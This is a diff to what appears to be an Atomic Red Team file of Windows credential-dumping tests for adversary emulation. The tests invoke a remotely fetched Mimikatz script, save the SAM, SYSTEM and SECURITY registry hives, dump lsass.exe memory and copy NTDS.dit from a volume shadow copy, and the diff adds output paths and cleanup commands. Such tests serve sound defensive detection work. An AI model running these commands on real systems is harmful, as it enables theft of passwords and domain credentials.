@@ -6,13 +6,16 @@ atomic_tests:
 - name: Powershell Mimikatz
   description: |
     Dumps Credentials via Powershell by invoking a remote mimikatz script
+
   supported_platforms:
     - windows
+
   input_arguments:
     remote_script:
       description: URL to a remote Mimikatz script that dumps credentials
       type: Url
       default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+
   executor:
     name: powershell
     elevation_required: true
@@ -22,8 +25,10 @@ atomic_tests:
 - name: Gsecdump
   description: |
     https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+
   supported_platforms:
     - windows
+
   executor:
     name: command_prompt
     elevation_required: true
@@ -33,13 +38,16 @@ atomic_tests:
 - name: Windows Credential Editor
   description: |
     http://www.ampliasecurity.com/research/windows-credentials-editor/
+
   supported_platforms:
     - windows
+
   input_arguments:
     output_file:
       description: Path where resulting data should be placed
       type: Path
       default: output.txt
+
   executor:
     name: command_prompt
     elevation_required: true
@@ -50,19 +58,27 @@ atomic_tests:
   description: |
     Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
     via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+
   supported_platforms:
     - windows
+
+  input_arguments:
+    output_folder:
+      description: Output folder path
+      type: Path
+      default: C:\Windows\Temp
+      
   executor:
     name: command_prompt
     elevation_required: true
     command: |
-      reg save HKLM\sam sam
-      reg save HKLM\system system
-      reg save HKLM\security security
+      reg save HKLM\sam "#{output_folder}\sam"
+      reg save HKLM\system "#{output_folder}\system"
+      reg save HKLM\security "#{output_folder}\security"
     cleanup_command: |
-      rm sam
-      rm system
-      rm security
+      rm "#{output_folder}\sam"
+      rm "#{output_folder}\system"
+      rm "#{output_folder}\security"
 
 - name: Dump LSASS.exe Memory using ProcDump
   description: |
@@ -94,8 +110,10 @@ atomic_tests:
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
     Manager and administrative permissions.
+
   supported_platforms:
     - windows
+
   executor:
     name: manual
     steps: |
@@ -110,18 +128,20 @@ atomic_tests:
       3. Dump lsass.exe memory:
         Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
 
-
 - name: Offline Credential Theft With Mimikatz
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
     Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz.
+
   supported_platforms:
     - windows
+
   input_arguments:
     input_file:
       description: Path where resulting dump should be placed
       type: Path
       default: lsass_dump.dmp
+
   executor:
     name: manual
     steps: |
@@ -139,13 +159,16 @@ atomic_tests:
     The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
     uses the "IFM" or "Install From Media" backup functionality that allows Active Directory restoration or installation of
     subsequent domain controllers without the need of network-based replication.
+
   supported_platforms:
     - windows
+
   input_arguments:
     output_folder:
       description: Path where resulting dump should be placed
       type: Path
-      default: C:\Atomic_Red_Team
+      default: C:\Windows\Temp
+
   executor:
     name: command_prompt
     elevation_required: true
@@ -155,13 +178,16 @@ atomic_tests:
 - name: Create Volume Shadow Copy with NTDS.dit
   description: |
     The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
+
   supported_platforms:
     - windows
+
   input_arguments:
     drive_letter:
       description: Drive letter to source VSC (including colon)
       type: String
       default: "C:"
+
   executor:
     name: command_prompt
     elevation_required: true
@@ -175,8 +201,10 @@ atomic_tests:
     This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
     A successful test also requires the export of the SYSTEM Registry hive. 
     This test must be executed on a Windows Domain Controller.
+
   supported_platforms:
     - windows
+
   input_arguments:
     vsc_name:
       description: Name of Volume Shadow Copy
@@ -185,7 +213,8 @@ atomic_tests:
     extract_path:
       description: Path for extracted NTDS.dit
       type: Path
-      default: C:\Extract
+      default: C:\Windows\Temp
+
   executor:
     name: command_prompt
     elevation_required: true
@@ -193,6 +222,10 @@ atomic_tests:
       copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
       copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
       reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+    cleanup_command: |
+      rm "#{extract_path}\ntds.dit"
+      rm "#{extract_path}\VSC_SYSTEM_HIVE"
+      rm "#{extract_path}\SYSTEM_HIVE"
 
 - name: GPP Passwords (findstr)
   description: |
